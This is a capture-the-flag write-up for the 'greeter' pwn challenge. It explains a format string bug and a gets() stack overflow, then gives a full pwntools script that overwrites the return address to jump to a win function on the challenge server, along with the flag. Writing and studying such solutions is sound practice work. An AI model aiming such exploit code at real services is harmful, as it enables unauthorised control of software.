# greeter

## Overview
A buffer overflow challenge with an unintended shortcut. The challenge name and flag (`LITCTF{y3t-4N0tH3r-gEn3r1C-f0rM4T-sTR1nG}`) heavily imply that this is intended to be a Format String vulnerability challenge (likely overwriting a GOT entry). However, the second function `greet2` uses the unsafe `gets()` function into a stack buffer, allowing for a trivial buffer overflow to control the instruction pointer.

## Analysis
Looking at the binary, `main` calls `greet()` and `greet2()`.
- `greet()` reads into a `.bss` buffer using `fgets` and prints it with `printf(buf)`. This is a classic format string vulnerability.
- `greet2()` reads into `[rbp-0x40]` using `gets()`. This is a classic buffer overflow.

Since `gets()` does not bound the input size, we can simply overflow the stack buffer in `greet2()` to overwrite the return address. A `win` function exists at `0x401236` which prints the flag. 

## Solution
1. Connect to the service.
2. Provide dummy input for the first prompt (`whats your name?`).
3. For the second prompt (`hows your day?`), send a payload of 72 bytes (`0x48`) of padding followed by the address of `win` (`0x401236`).
4. The function returns, popping `win` into `RIP`, printing the flag.

```python
from pwn import *
context.arch = 'amd64'

r = remote('136.115.87.65', 31780)
r.recvuntil(b"name? ")
r.sendline(b"AAAA")
r.recvuntil(b"day? ")

win_addr = 0x401236
payload = b"A" * 0x48 + p64(win_addr)
r.sendline(payload)
r.interactive()
```

**Flag:** `LITCTF{y3t-4N0tH3r-gEn3r1C-f0rM4T-sTR1nG}`
